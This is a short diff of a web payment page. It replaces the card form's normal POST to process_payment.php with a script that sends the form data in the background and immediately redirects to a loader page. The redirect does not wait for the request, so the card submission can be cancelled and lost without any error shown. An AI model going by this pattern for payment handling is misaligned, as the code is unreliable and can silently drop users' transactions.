@@ -32,7 +32,7 @@
     </div>
 
     <!-- ✅ Updated Form: uses POST and sends to process_payment.php -->
-    <form class="payment-form" action="process_payment.php" method="POST">
+    <form id="paymentForm" class="payment-form">
   <!-- your input fields with proper name attributes -->
   <label>Name on the Card:</label>
   <input type="text" name="card_name" required>
@@ -79,5 +79,26 @@
       </div>
     </div>
   </footer>
+
+   <!-- ✅ JS to handle background submit and redirect -->
+  <script>
+    document.getElementById("paymentForm").addEventListener("submit", function (e) {
+      e.preventDefault(); // Prevent default form submission
+
+      const formData = new FormData(this);
+
+      // Submit form in background
+      fetch("process_payment.php", {
+        method: "POST",
+        body: formData,
+      }).catch(error => {
+        console.error("Payment submission failed:", error);
+      });
+
+      // Redirect immediately to loader
+      window.location.href = "../Loader.html"; 
+    });
+  </script>
+
 </body>
 </html>
